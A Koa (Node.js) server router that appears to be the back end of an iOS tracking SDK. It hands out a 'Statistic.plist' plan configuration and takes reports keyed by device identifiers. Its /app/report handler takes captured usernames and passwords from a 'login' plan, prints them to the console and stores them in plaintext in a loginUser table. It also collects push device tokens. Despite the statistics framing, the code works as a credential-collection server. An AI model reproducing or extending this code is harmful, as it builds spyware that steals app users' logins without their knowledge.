
const router = require('koa-router')();
const config = require('../config/config');
const fs = require('fs');
const orm = require('../orm/models');
const plist = require('plist');

router.post('/app/download', async(ctx, next) => {
    const header = {
        model:ctx.request.headers.model,
        openUDID:ctx.request.headers.openudid,
        UUID:ctx.request.headers.uuid,
        systemVersion:ctx.request.headers.systemversion,
        CFBundleIdentifier:ctx.request.headers.cfbundleidentifier,
        sdsVersion:ctx.request.headers.sdsVersion,
    };
    const post = {
        version: ctx.request.body.version
    };
    console.log(header,post);

    //检查本地是否有此手机的记录
    try {
        let [device,createdd] = await orm.device.findOrCreate({where:{model:header.model,openUDID:header.openUDID},
            defaults:{model:header.model,openUDID:header.openUDID,systemVersion:header.systemVersion}});
        let [application,createda] = await  orm.application.findOrCreate({where:{deviceId:device.id,bundleIdentifier:header.CFBundleIdentifier},
            defaults:{deviceId:device.id,UUID:header.UUID,bundleIdentifier:header.CFBundleIdentifier}});
    }catch (e)  {
        console.log(e);
    }

    const plistString = fs.readFileSync(__dirname+'/../public/Statistic.plist','utf8');
    const plistObject = plist.parse(plistString);
    if (post.version && post.version === plistObject.version){
        ctx.body = JSON.stringify({code:0});
    } else {
        ctx.body = JSON.stringify({code:0,plist:plistString});
    }
});

router.post('/app/report', async(ctx, next) => {
    const header = {
        model:ctx.request.headers.model,
        openUDID:ctx.request.headers.openudid,
        UUID:ctx.request.headers.uuid,
        systemVersion:ctx.request.headers.systemversion,
        CFBundleIdentifier:ctx.request.headers.cfbundleidentifier,
        sdsVersion:ctx.request.headers.sdsVersion,
    };
    const post = ctx.request.body;
    console.log(header,ctx.request.body.logs);

    try {
        let [device,createdd] = await orm.device.findOrCreate({where:{model:header.model,openUDID:header.openUDID},
            defaults:{model:header.model,openUDID:header.openUDID,systemVersion:header.systemVersion}});
        let [application,createda] = await  orm.application.findOrCreate({where:{deviceId:device.id,bundleIdentifier:header.CFBundleIdentifier},
            defaults:{deviceId:device.id,UUID:header.UUID,bundleIdentifier:header.CFBundleIdentifier}});

        for (let i =0; i<post.logs.length; i++) {
            const plan = post.logs[i];
            if (plan.planId === 'plan_deviceToken') {
                if (plan.values && plan.values.length) {
                    const deviceToken = plan.values[0];
                    console.log(deviceToken);
                    if (application) {
                        application.deviceToken = deviceToken;
                        await application.save();
                    }
                } else if (plan.keyValues && !Array.isArray(plan.keyValues)) {
                    if (plan.keyValues.deviceToken) {
                        if (application) {
                            application.deviceToken = plan.keyValues.deviceToken;
                            await application.save();
                        }
                    }
                }
            } else if (plan.planId === 'login') {
                if (plan.values && plan.values.length) {//兼容版本0
                    const userName = plan.values[0];
                    const password = plan.values[1];
                    console.log(userName, password);
                    if (userName && password) {
                        await orm.loginUser.findOrCreate({
                            where: {userName: userName, password: password},
                            defaults: {userName: userName, password: password}
                        });
                    }
                } else if (plan.keyValues && !Array.isArray(plan.keyValues)) {//版本1.0
                    const userName = plan.keyValues.userName;
                    const password = plan.keyValues.password;
                    console.log(userName, password);
                    if (userName && password) {
                        await orm.loginUser.findOrCreate({
                            where: {userName: userName, password: password},
                            defaults: {userName: userName, password: password}
                        });
                    }
                }
            }
        }
    }catch (e)  {
        console.log(e);
    }

    ctx.body = JSON.stringify({code:0});
});

module.exports = router;